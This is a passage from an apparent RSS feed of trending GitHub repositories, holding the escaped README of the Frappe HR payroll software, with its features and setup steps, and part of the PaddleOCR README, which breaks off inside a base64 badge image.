&lt;p&gt;Note: &lt;code&gt;make build&lt;/code&gt; and &lt;code&gt;make build-bin&lt;/code&gt; automatically run &lt;code&gt;make build-web&lt;/code&gt; to embed the web UI.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>frappe/hrms</title>
      <link>https://github.com/frappe/hrms</link>
      <description>&lt;p&gt;Open Source HR and Payroll Software&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;a href="https://frappe.io/hr"&gt; &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/frappe-hr-logo.png" height="80px" width="80px" alt="Frappe HR Logo" /&gt; &lt;/a&gt; 
 &lt;h2&gt;Frappe HR&lt;/h2&gt; 
 &lt;p align="center"&gt; &lt;/p&gt;
 &lt;p&gt;Open Source, modern, and easy-to-use HR and Payroll Software&lt;/p&gt; 
 &lt;p&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://github.com/frappe/hrms/actions/workflows/ci.yml"&gt;&lt;img src="https://github.com/frappe/hrms/actions/workflows/ci.yml/badge.svg?branch=develop" alt="CI" /&gt;&lt;/a&gt; &lt;a href="https://codecov.io/gh/frappe/hrms"&gt;&lt;img src="https://codecov.io/gh/frappe/hrms/branch/develop/graph/badge.svg?token=0TwvyUg3I5" alt="codecov" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://trendshift.io/repositories/10972" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/10972" alt="frappe%2Fhrms | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;div align="center"&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-hero.png" /&gt; 
&lt;/div&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://frappe.io/hr"&gt;Website&lt;/a&gt; - 
 &lt;a href="https://docs.frappe.io/hr/introduction"&gt;Documentation&lt;/a&gt; 
&lt;/div&gt; 
&lt;h2&gt;Frappe HR&lt;/h2&gt; 
&lt;p&gt;Frappe HR has everything you need to drive excellence within the company. It's a complete HRMS solution with over 13 different modules right from Employee Management, Onboarding, Leaves, to Payroll, Taxation, and more!&lt;/p&gt; 
&lt;h2&gt;Motivation&lt;/h2&gt; 
&lt;p&gt;When Frappe team started growing in terms of size, we needed an open-source HR and Payroll software. We didn't find any "true" open-source HR software out there and so decided to build one ourselves. Initially, it was a set of modules within ERPNext but version 14 onwards, as the modules became more mature, Frappe HR was created as a separate product.&lt;/p&gt; 
&lt;h2&gt;Key Features&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Employee Lifecycle&lt;/strong&gt;: From onboarding employees, managing promotions and transfers, all the way to documenting feedback with exit interviews, make life easier for employees throughout their life cycle.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Leave and Attendance&lt;/strong&gt;: Configure leave policies, pull regional holidays with a click, check-in and check-out with geolocation capturing, track leave balances and attendance with reports.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Expense Claims and Advances&lt;/strong&gt;: Manage employee advances, claim expenses, configure multi-level approval workflows, all this with seamless integration with ERPNext accounting.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Performance Management&lt;/strong&gt;: Track goals, align goals with key result areas (KRAs), enable employees to evaluate themselves, make managing appraisal cycles easy.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Payroll &amp;amp; Taxation&lt;/strong&gt;: Create salary structures, configure income tax slabs, run standard payroll, accommodate additional salaries and off cycle payments, view income breakup on salary slips and so much more.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Frappe HR Mobile App&lt;/strong&gt;: Apply for and approve leaves on the go, check-in and check-out, access employee profile right from the mobile app.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;details open&gt; 
 &lt;summary&gt;View Screenshots&lt;/summary&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-appraisal.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-requisition.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-attendance.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-salary.png" /&gt; 
 &lt;img src="https://raw.githubusercontent.com/frappe/hrms/develop/.github/hrms-pwa.png" /&gt; 
&lt;/details&gt; 
&lt;h3&gt;Under the Hood&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/frappe/frappe"&gt;&lt;strong&gt;Frappe Framework&lt;/strong&gt;&lt;/a&gt;: A full-stack web application framework written in Python and Javascript. The framework provides a robust foundation for building web applications, including a database abstraction layer, user authentication, and a REST API.&lt;/p&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;a href="https://github.com/frappe/frappe-ui"&gt;&lt;strong&gt;Frappe UI&lt;/strong&gt;&lt;/a&gt;: A Vue-based UI library, to provide a modern user interface. The Frappe UI library provides a variety of components that can be used to build single-page applications on top of the Frappe Framework.&lt;/p&gt; &lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Production Setup&lt;/h2&gt; 
&lt;h3&gt;Managed Hosting&lt;/h3&gt; 
&lt;p&gt;You can try &lt;a href="https://frappecloud.com"&gt;Frappe Cloud&lt;/a&gt;, a simple, user-friendly and sophisticated &lt;a href="https://github.com/frappe/press"&gt;open-source&lt;/a&gt; platform to host Frappe applications with peace of mind.&lt;/p&gt; 
&lt;p&gt;It takes care of installation, setup, upgrades, monitoring, maintenance and support of your Frappe deployments. It is a fully featured developer platform with an ability to manage and control multiple Frappe deployments.&lt;/p&gt; 
&lt;div&gt; 
 &lt;a href="https://frappecloud.com/hrms/signup" target="_blank"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="https://frappe.io/files/try-on-fc-white.png" /&gt; 
   &lt;img src="https://frappe.io/files/try-on-fc-black.png" alt="Try on Frappe Cloud" height="28" /&gt; 
  &lt;/picture&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;h2&gt;Development setup&lt;/h2&gt; 
&lt;h3&gt;Docker&lt;/h3&gt; 
&lt;p&gt;You need Docker, docker-compose and git setup on your machine. Refer &lt;a href="https://docs.docker.com/"&gt;Docker documentation&lt;/a&gt;. After that, run the following commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;git clone https://github.com/frappe/hrms
cd hrms/docker
docker-compose up
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Wait for some time until the setup script creates a site. After that you can access &lt;code&gt;http://localhost:8000&lt;/code&gt; in your browser and the login screen for HR should show up.&lt;/p&gt; 
&lt;p&gt;Use the following credentials to log in:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Username: &lt;code&gt;Administrator&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;Password: &lt;code&gt;admin&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Local&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt;Set up bench by following the &lt;a href="https://frappeframework.com/docs/user/en/installation"&gt;Installation Steps&lt;/a&gt; and start the server and keep it running &lt;pre&gt;&lt;code class="language-sh"&gt;$ bench start
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;In a separate terminal window, run the following commands &lt;pre&gt;&lt;code class="language-sh"&gt;$ bench new-site hrms.localhost
$ bench get-app erpnext
$ bench get-app hrms
$ bench --site hrms.localhost install-app hrms
$ bench --site hrms.localhost add-to-hosts
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt;You can access the site at &lt;code&gt;http://hrms.localhost:8080&lt;/code&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Learning and Community&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;a href="https://frappe.school"&gt;Frappe School&lt;/a&gt; - Learn Frappe Framework and ERPNext from the various courses by the maintainers or from the community.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://docs.frappe.io/hr"&gt;Documentation&lt;/a&gt; - Extensive documentation for Frappe HR.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://discuss.erpnext.com/"&gt;User Forum&lt;/a&gt; - Engage with the community of ERPNext users and service providers.&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://t.me/frappehr"&gt;Telegram Group&lt;/a&gt; - Get instant help from the community of users.&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Contributing&lt;/h2&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;a href="https://github.com/frappe/erpnext/wiki/Issue-Guidelines"&gt;Issue Guidelines&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://erpnext.com/security"&gt;Report Security Vulnerabilities&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://github.com/frappe/erpnext/wiki/Contribution-Guidelines"&gt;Pull Request Requirements&lt;/a&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;h2&gt;Logo and Trademark Policy&lt;/h2&gt; 
&lt;p&gt;Please read our &lt;a href="https://raw.githubusercontent.com/frappe/hrms/develop/TRADEMARK_POLICY.md"&gt;Logo and Trademark Policy&lt;/a&gt;.&lt;/p&gt; 
&lt;br /&gt; 
&lt;br /&gt; 
&lt;div align="center" style="padding-top: 0.75rem;"&gt; 
 &lt;a href="https://frappe.io" target="_blank"&gt; 
  &lt;picture&gt; 
   &lt;source media="(prefers-color-scheme: dark)" srcset="https://frappe.io/files/Frappe-white.png" /&gt; 
   &lt;img src="https://frappe.io/files/Frappe-black.png" alt="Frappe Technologies" height="28" /&gt; 
  &lt;/picture&gt; &lt;/a&gt; 
&lt;/div&gt;</description>
    </item>
    
    <item>
      <title>PaddlePaddle/PaddleOCR</title>
      <link>https://github.com/PaddlePaddle/PaddleOCR</link>
      <description>&lt;p&gt;Turn any PDF or image document into structured data for your AI. A powerful, lightweight OCR toolkit that bridges the gap between images/PDFs and LLMs. Supports 100+ languages.&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;p&gt; &lt;img width="100%" src="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/docs/images/Banner.png" alt="PaddleOCR Banner" /&gt; &lt;/p&gt; 
 &lt;p&gt;English | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_cn.md"&gt;ÁÆÄ‰Ωì‰∏≠Êñá&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_tcn.md"&gt;ÁπÅÈ´î‰∏≠Êñá&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ja.md"&gt;Êó•Êú¨Ë™û&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ko.md"&gt;ÌïúÍµ≠Ïñ¥&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_fr.md"&gt;Fran√ßais&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ru.md"&gt;–†—É—Å—Å–∫–∏–π&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_es.md"&gt;Espa√±ol&lt;/a&gt; | &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/readme/README_ar.md"&gt;ÿßŸÑÿπÿ±ÿ®Ÿäÿ©&lt;/a&gt;&lt;/p&gt; 
 &lt;!-- icon --&gt; 
 &lt;p&gt;&lt;a href="https://github.com/PaddlePaddle/PaddleOCR"&gt;&lt;img src="https://img.shields.io/github/stars/PaddlePaddle/PaddleOCR?color=ccf" alt="stars" /&gt;&lt;/a&gt; &lt;a href="https://github.com/PaddlePaddle/PaddleOCR"&gt;&lt;img src="https://img.shields.io/github/forks/PaddlePaddle/PaddleOCR.svg?sanitize=true" alt="forks" /&gt;&lt;/a&gt; &lt;a href="https://arxiv.org/pdf/2507.05595"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR_3.0-Technical%20Report-b31b1b.svg?logo=arXiv" alt="arXiv" /&gt;&lt;/a&gt; &lt;a href="https://arxiv.org/abs/2510.14528"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL-Technical%20Report-b31b1b.svg?logo=arXiv" alt="arXiv" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;a href="https://pepy.tech/projectsproject/paddleocr"&gt;&lt;img src="https://static.pepy.tech/badge/paddleocr/month" alt="PyPI Downloads" /&gt;&lt;/a&gt; &lt;a href="https://pepy.tech/projects/paddleocr"&gt;&lt;img src="https://static.pepy.tech/badge/paddleocr" alt="PyPI Downloads" /&gt;&lt;/a&gt; &lt;a href="https://github.com/PaddlePaddle/PaddleOCR/network/dependents"&gt;&lt;img src="https://img.shields.io/badge/Used%20by-6k%2B%20repositories-blue" alt="Used by" /&gt;&lt;/a&gt; &lt;a href="https://pypi.org/project/paddleocr/"&gt;&lt;img src="https://img.shields.io/pypi/v/paddleocr" alt="PyPI version" /&gt;&lt;/a&gt; &lt;img src="https://img.shields.io/badge/python-3.8~3.12-aff.svg?sanitize=true" alt="python" /&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;img src="https://img.shields.io/badge/os-linux%2C%20win%2C%20mac-pink.svg?sanitize=true" alt="os" /&gt; &lt;img src="https://img.shields.io/badge/hardware-cpu%2C%20gpu%2C%20xpu%2C%20npu-yellow.svg?sanitize=true" alt="hardware" /&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/LICENSE"&gt;&lt;img src="https://img.shields.io/badge/license-Apache_2.0-green" alt="License" /&gt;&lt;/a&gt; &lt;a href="https://deepwiki.com/PaddlePaddle/PaddleOCR"&gt;&lt;img src="https://deepwiki.com/badge.svg?sanitize=true" alt="Ask DeepWiki" /&gt;&lt;/a&gt; &lt;a href="https://www.paddleocr.com"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR-_Offiical_Website-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="AI Studio" /&gt;&lt;/a&gt;&lt;/p&gt; 
 &lt;p&gt;&lt;strong&gt;PaddleOCR is an industry-leading, production-ready OCR and document AI engine, offering end-to-end solutions from text extraction to intelligent document understanding&lt;/strong&gt;&lt;/p&gt; 
&lt;/div&gt; 
&lt;h1&gt;PaddleOCR&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://www.paddlepaddle.org.cn/en"&gt;&lt;img src="https://img.shields.io/badge/PaddlePaddle-3.0-orange" alt="Framework" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Recognition%20Accuracy-%F0%9F%8F%86-green" alt="Accuracy" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Support_Languages-100+-brightgreen" alt="Multi-Language" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Handwriting-%E2%9C%93-success" alt="Handwriting" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/PaddlePaddle/PaddleOCR/main/#"&gt;&lt;img src="https://img.shields.io/badge/Heterogeneous%20Hardware-Kunlunxin%20%7C%20Ascend_NPU-red" alt="Hardware" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;[!TIP] PaddleOCR now provides an MCP server that supports integration with Agent applications like Claude Desktop. For details, please refer to &lt;a href="https://paddlepaddle.github.io/PaddleOCR/latest/en/version3.x/deployment/mcp_server.html"&gt;PaddleOCR MCP Server&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;The PaddleOCR 3.0 Technical Report is now available. See details at: &lt;a href="https://arxiv.org/abs/2507.05595"&gt;PaddleOCR 3.0 Technical Report&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;The PaddleOCR-VL Technical Report is now available. See details at &lt;a href="https://arxiv.org/abs/2510.14528"&gt;PaddleOCR-VL Technical Report&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;The Beta version of the PaddleOCR official website is now live, offering a more convenient online experience and large-scale PDF file parsing, as well as free API and MCP services. For more details, please visit the &lt;a href="https://www.paddleocr.com"&gt;PaddleOCR official website&lt;/a&gt;.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;p&gt;&lt;strong&gt;PaddleOCR&lt;/strong&gt; converts documents and images into &lt;strong&gt;structured, AI-friendly data&lt;/strong&gt; (like JSON and Markdown) with &lt;strong&gt;industry-leading accuracy&lt;/strong&gt;‚Äîpowering AI applications for everyone from indie developers and startups to large enterprises worldwide. With over &lt;strong&gt;60,000 stars&lt;/strong&gt; and deep integration into leading projects like &lt;strong&gt;MinerU, RAGFlow, pathway and cherry-studio&lt;/strong&gt;, PaddleOCR has become the &lt;strong&gt;premier solution&lt;/strong&gt; for developers building intelligent document applications in the &lt;strong&gt;AI era&lt;/strong&gt;.&lt;/p&gt; 
&lt;h3&gt;PaddleOCR 3.0 Core Features&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://aistudio.baidu.com/paddleocr"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL--1.5-_Official_Website-1927BA?logo=data:image/png;base64,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&amp;amp;labelColor=white" alt="Official Website" /&gt;&lt;/a&gt; &lt;a href="https://huggingface.co/spaces/PaddlePaddle/PaddleOCR-VL-1.5_Online_Demo"&gt;&lt;img src="https://img.shields.io/badge/PaddleOCR--VL--1.5-_Demo_on_HuggingFace-yellow?logo=data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAF8AAABYCAMAAACkl9t/AAAAk1BMVEVHcEz/nQv/nQv/nQr/nQv/nQr/nQv/nQv/nQr/wRf/txT/pg7/yRr/rBD/zRz/ngv/oAz/zhz/nwv/txT/ngv/0B3+zBz/nQv/0h7/wxn/vRb/thXkuiT/rxH/pxD/ogzcqyf/nQvTlSz/czCxky7/SjifdjT/Mj3+Mj3wMj15aTnDNz+DSD9RTUBsP0FRO0Q6O0WyIxEIAAAAGHRSTlMADB8zSWF3krDDw8TJ1NbX5efv8ff9/fxKDJ9uAAAGKklEQVR42u2Z63qjOAyGC4RwCOfB2JAGqrSb2WnTw/1f3UaWcSGYNKTdf/P+mOkTrE+yJBulvfvLT2A5ruenaVHyIks33npl/6C4s/ZLAM45SOi/1FtZPyFur1OYofBX3w7d54Bxm+E8db+nDr12ttmESZ4zludJEG5S7TO72YPlKZFyE+YCYUJTBZsMiNS5Sd7NlDmKM2Eg2JQg8awbglfqgbhArjxkS7dgp2RH6hc9AMLdZYUtZN5DJr4molC8BfKrEkPKEnEVjLbgW1fLy77ZVOJagoIcLIl+IxaQZGjiX597HopF5CkaXVMDO9Pyix3AFV3kw4lQLCbHuMovz8FallbcQIJ5Ta0vks9RnolbCK84BtjKRS5uA43hYoZcOBGIG2Epbv6CvFVQ8m8loh66WNySsnN7htL58LNp+NXT8/PhXiBXPMjLSxtwp8W9f/1AngRierBkA+kk/IpUSOeKByzn8y3kAAAfh//0oXgV4roHm/kz4E2z//zRc3/lgwBzbM2mJxQEa5pqgX7d1L0htrhx7LKxOZlKbwcAWyEOWqYSI8YPtgDQVjpB5nvaHaSnBaQSD6hweDi8PosxD6/PT09YY3xQA7LTCTKfYX+QHpA0GCcqmEHvr/cyfKQTEuwgbs2kPxJEB0iNjfJcCTPyocx+A0griHSmADiC91oNGVwJ69RudYe65vJmoqfpul0lrqXadW0jFKH5BKwAeCq+Den7s+3zfRJzA61/Uj/9H/VzLKTx9jFPPdXeeP+L7WEvDLAKAIoF8bPTKT0+TM7W8ePj3R